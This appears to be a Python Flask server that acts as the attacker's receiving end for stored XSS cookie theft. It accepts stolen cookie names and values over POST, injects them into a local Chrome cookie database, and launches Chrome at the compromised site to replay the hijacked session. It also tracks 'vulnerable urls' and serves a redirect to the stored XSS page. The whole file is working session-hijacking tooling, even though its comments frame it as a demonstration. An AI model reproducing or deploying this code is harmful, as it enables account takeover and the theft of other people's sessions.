import sys
from subprocess import Popen

import validators

from flask import Flask, request, render_template
from flask_api import status
from flask_cors import CORS, cross_origin

from sqlalchemy import create_engine
from sqlalchemy.orm import Session
from sqlalchemy.ext.automap import automap_base

"""
Hardcoded UTC dates for the cookie. Easier than generating them on the fly
since Chrome's database uses the creation_utc as the cookie's primary key
and we want to delete any spurious cookies we stored previously.
"""
CREATION_UTC = 13120468750054245
EXPIRES_UTC = 13435828750000000
ACCESSED_UTC = 13133004531246831

app = Flask(__name__)
CORS(app)


if len(sys.argv) < 2:
    print("Usage: python3 server.py <PATH_TO_CHROME_COOKIE_DATABASE>")
    sys.exit(1)

engine = create_engine("sqlite:///{}".format(sys.argv[1]))
Base = automap_base()
Base.prepare(engine, reflect=True)

Cookie = Base.classes.cookies

session = Session(engine)

"""
For now, use in-memory list of urls rather than a database
"""
urls = []

@app.route("/")
def home():
    return "POST cookies in /cookie_jar"


@app.route("/store_url", methods=["POST"])
def store_url():
    """
    Store a url for a stored XSS attack:
    url - the url where the XSS script is stored
    """
    url = request.form.get("url")

    if not url:
        return "Must provide url\n", status.HTTP_400_BAD_REQUEST

    if not url.startswith("http://"):
        url = "http://" + url

    if not validators.url(url):
        return "Invalid url: {}".format(url), status.HTTP_400_BAD_REQUEST

    if url not in urls:
        if not url.startswith("http://"):
            url = "http://" + url
        urls.append(url)

    return "Successfully stored {}\nVulnerable urls: {}\n".format(url, urls)

@app.route("/redirect")
def redirect():
    """
    Store a url for a stored XSS attack:
    url - the url where the XSS script is stored
    """

    url = urls[0] if urls else None
    return render_template("redirect.html", url=url)

def create_cookie(url, name, value):
    cookie = Cookie(
        host_key=url,
        name=name,
        value="",
        path="/",
        secure=0,
        httponly=0,
        encrypted_value=value.encode("utf-8"),
        creation_utc=CREATION_UTC,
        expires_utc=EXPIRES_UTC,
        last_access_utc=ACCESSED_UTC)
    return cookie


@app.route("/cookie_jar", methods=["POST"])
def store_cookie():
    """
    Store a cookie in Chrome's database and open the browser to the target url

    Expects a POST request with the following data:
    url - the url of the compromised site
    cookie_name - the name of the stolen cookie
    cookie_value - the value of the stolen cookie
    """
    url = request.form.get("url")
    cookie_name = request.form.get("cookie_name")
    cookie_value = request.form.get("cookie_value")

    if not all([url, cookie_name, cookie_value]):
        return "Must provide url, cookie_name, and cookie_value\n",\
                status.HTTP_400_BAD_REQUEST

    if not url.startswith("http://"):
        url = "http://" + url

    # validate the url to prevent arbitrary shell execution
    # TODO: whitelist domains/ips to prevent visiting arbitrary urls
    if not validators.url(url) and not validators.url("http://" + url):
        return "Invalid url: {}".format(url), status.HTTP_400_BAD_REQUEST

    # delete previously stored cookies using the creation_utc
    for cookie in session.query(Cookie).filter(
            Cookie.creation_utc == CREATION_UTC):
        session.delete(cookie)
    session.commit()

    cookie = create_cookie(url, cookie_name, cookie_value)

    session.add(cookie)
    session.commit()

    # open chrome at the target site to demonstrate the stolen cookie
    Popen(["google-chrome", "{}".format(url)])

    return "Success\n"


if __name__ == "__main__":
    app.run()
